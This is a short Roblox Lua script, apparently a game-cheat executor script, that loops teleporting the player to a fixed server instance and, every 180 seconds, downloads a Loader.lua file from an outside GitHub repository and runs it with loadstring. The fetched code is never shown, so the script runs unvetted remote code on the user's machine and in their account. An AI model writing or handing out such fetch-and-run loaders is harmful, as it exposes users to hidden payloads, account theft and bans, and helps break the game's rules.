-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 180
while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "6e0c7dfe-8fd3-4b54-bd5e-92126a6a559a")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
